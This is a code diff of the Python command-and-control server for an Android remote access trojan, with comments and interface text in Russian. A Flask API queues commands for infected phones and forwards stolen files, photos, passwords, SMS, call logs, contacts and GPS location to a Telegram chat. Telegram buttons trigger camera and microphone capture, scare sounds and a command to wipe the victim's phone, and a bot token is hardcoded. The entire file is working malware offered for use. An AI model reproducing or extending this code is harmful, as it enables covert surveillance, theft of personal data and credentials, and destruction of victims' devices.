@@ -1,13 +1,10 @@
-# TWEAKOS_ANDROID_RAT_FULL.py
-# ПОЛНЫЙ RAT ДЛЯ ANDROID: КРАЖА ВСЕГО + УНИЧТОЖЕНИЕ + МЕДИА
-
 import os
 import time
 import threading
 import requests
 import json
 import base64
-from flask import Flask, request, jsonify, send_file
+from flask import Flask, request, jsonify
 from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
 
@@ -15,28 +12,28 @@ app = Flask(__name__)
 
 # ========== КОНФИГУРАЦИЯ ==========
 BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
+if not BOT_TOKEN:
+    BOT_TOKEN = '8913913495:AAGLOD7rpnUUAEqQQlCVD1dLqrYkMLYqfIs'
 CHAT_ID = '7803661441'
-SERVER_URL = os.environ.get('SERVER_URL', 'https://doge-rat-server-main-d61c2fa.kubernetes.cloud')
 
 bot = Bot(token=BOT_TOKEN)
 latest_command = {"cmd": "none", "params": ""}
-pending_media = {}
 
 # ========== КНОПКИ TELEGRAM ==========
 def main_menu():
     keyboard = [
         [InlineKeyboardButton("📁 ФАЙЛЫ", callback_data='menu_files')],
-        [InlineKeyboardButton("📸 ГАЛЕРЕЯ", callback_data='menu_gallery')],
-        [InlineKeyboardButton("🔑 ПАРОЛИ", callback_data='menu_passwords')],
-        [InlineKeyboardButton("📝 ЗАМЕТКИ", callback_data='menu_notes')],
+        [InlineKeyboardButton("📸 ГАЛЕРЕЯ", callback_data='gallery')],
+        [InlineKeyboardButton("🔑 ПАРОЛИ", callback_data='passwords')],
+        [InlineKeyboardButton("📝 ЗАМЕТКИ", callback_data='notes')],
         [InlineKeyboardButton("🎥 КАМЕРА", callback_data='menu_camera')],
         [InlineKeyboardButton("🎙️ МИКРОФОН", callback_data='menu_mic')],
         [InlineKeyboardButton("🔊 ЗВУКИ", callback_data='menu_sounds')],
-        [InlineKeyboardButton("💥 СНЕСТИ ТЕЛЕФОН", callback_data='wipe')],
-        [InlineKeyboardButton("📡 ЛОКАЦИЯ", callback_data='location')],
+        [InlineKeyboardButton("📍 ЛОКАЦИЯ", callback_data='location')],
         [InlineKeyboardButton("💬 СМС", callback_data='sms')],
         [InlineKeyboardButton("📞 ЗВОНКИ", callback_data='calls')],
-        [InlineKeyboardButton("👥 КОНТАКТЫ", callback_data='contacts')]
+        [InlineKeyboardButton("👥 КОНТАКТЫ", callback_data='contacts')],
+        [InlineKeyboardButton("💥 СНЕСТИ ТЕЛЕФОН", callback_data='wipe')]
     ]
     return InlineKeyboardMarkup(keyboard)
 
@@ -77,13 +74,13 @@ def sounds_menu():
     ]
     return InlineKeyboardMarkup(keyboard)
 
-# ========== ОБРАБОТЧИКИ КОМАНД ==========
+# ========== ОБРАБОТЧИКИ ==========
 def start(update, context):
     update.message.reply_text(
         "🤖 ANDROID RAT АКТИВИРОВАН\n\n"
         "📱 Управление телефоном жертвы\n"
         "🔐 Кража паролей, СМС, звонков, контактов\n"
-        "📸 Фото, видео, галерея, микрофон\n"
+        "📸 Фото, галерея, микрофон\n"
         "💥 Уничтожение системы\n\n"
         "👇 Используйте кнопки для управления",
         reply_markup=main_menu()
@@ -100,15 +97,6 @@ def handle_callback(update, context):
     # МЕНЮ
     elif data == 'menu_files':
         query.edit_message_text("📁 ВЫБЕРИТЕ ПАПКУ", reply_markup=files_menu())
-    elif data == 'menu_gallery':
-        set_command("gallery", "")
-        query.edit_message_text("📸 ЗАПРОС ГАЛЕРЕИ ОТПРАВЛЕН", reply_markup=main_menu())
-    elif data == 'menu_passwords':
-        set_command("passwords", "")
-        query.edit_message_text("🔑 ЗАПРОС ПАРОЛЕЙ ОТПРАВЛЕН", reply_markup=main_menu())
-    elif data == 'menu_notes':
-        set_command("notes", "")
-        query.edit_message_text("📝 ЗАПРОС ЗАМЕТОК ОТПРАВЛЕН", reply_markup=main_menu())
     elif data == 'menu_camera':
         query.edit_message_text("📸 ВЫБЕРИТЕ КАМЕРУ", reply_markup=camera_menu())
     elif data == 'menu_mic':
@@ -152,18 +140,27 @@ def handle_callback(update, context):
     # ЗВУКИ
     elif data == 'sound_siren':
         set_command("sound", "siren")
-        query.edit_message_text("🔊 СИРЕНА ЗАПУЩЕНА НА ТЕЛЕФОНЕ", reply_markup=main_menu())
+        query.edit_message_text("🔊 СИРЕНА ЗАПУЩЕНА", reply_markup=main_menu())
     elif data == 'sound_scary':
         set_command("sound", "scary")
-        query.edit_message_text("👻 СТРАШНЫЙ ЗВУК НА ТЕЛЕФОНЕ", reply_markup=main_menu())
+        query.edit_message_text("👻 СТРАШНЫЙ ЗВУК", reply_markup=main_menu())
     elif data == 'sound_rickroll':
         set_command("sound", "rickroll")
-        query.edit_message_text("🎵 RICKROLL НА ТЕЛЕФОНЕ", reply_markup=main_menu())
+        query.edit_message_text("🎵 RICKROLL", reply_markup=main_menu())
     elif data == 'sound_notify':
         set_command("sound", "notify")
-        query.edit_message_text("🔔 УВЕДОМЛЕНИЕ ОТПРАВЛЕНО", reply_markup=main_menu())
+        query.edit_message_text("🔔 УВЕДОМЛЕНИЕ", reply_markup=main_menu())
     
     # КРАЖА
+    elif data == 'gallery':
+        set_command("gallery", "")
+        query.edit_message_text("📸 ЗАПРОС ГАЛЕРЕИ ОТПРАВЛЕН", reply_markup=main_menu())
+    elif data == 'passwords':
+        set_command("passwords", "")
+        query.edit_message_text("🔑 ЗАПРОС ПАРОЛЕЙ ОТПРАВЛЕН", reply_markup=main_menu())
+    elif data == 'notes':
+        set_command("notes", "")
+        query.edit_message_text("📝 ЗАПРОС ЗАМЕТОК ОТПРАВЛЕН", reply_markup=main_menu())
     elif data == 'location':
         set_command("location", "")
         query.edit_message_text("📍 ЗАПРОС GPS ОТПРАВЛЕН", reply_markup=main_menu())
@@ -186,10 +183,14 @@ def set_command(cmd, params):
     latest_command["cmd"] = cmd
     latest_command["params"] = params
 
-# ========== FLASK API ДЛЯ ANDROID ==========
+# ========== FLASK API ==========
 @app.route('/')
 def home():
     return "✅ RAT сервер работает!", 200
+
+@app.route('/health')
+def health():
+    return "OK", 200
 
 @app.route('/get_command', methods=['GET'])
 def get_command():
@@ -208,7 +209,6 @@ def send_data():
         content = data.get('content', '')
         
         if msg_type == 'file':
-            # Приём файла (фото, аудио)
             filename = data.get('filename', 'file')
             filedata = base64.b64decode(content)
             filepath = f"/tmp/{filename}"
@@ -218,7 +218,6 @@ def send_data():
                 bot.send_document(chat_id=CHAT_ID, document=f, filename=filename)
             os.remove(filepath)
         elif msg_type == 'photo':
-            # Приём фото
             filedata = base64.b64decode(content)
             filepath = f"/tmp/photo_{int(time.time())}.jpg"
             with open(filepath, 'wb') as f:
@@ -236,12 +235,10 @@ def send_data():
             os.remove(filepath)
         else:
             bot.send_message(chat_id=CHAT_ID, text=f"📱 {msg_type.upper()}:\n{content[:3000]}")
-    
     return "OK", 200
 
 # ========== ЗАПУСК ==========
 def main():
-    # Telegram бот
     updater = Updater(BOT_TOKEN, use_context=True)
     dp = updater.dispatcher
     dp.add_handler(CommandHandler("start", start))
@@ -249,7 +246,6 @@ def main():
     
     threading.Thread(target=updater.start_polling, daemon=True).start()
     
-    # Flask сервер
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
 
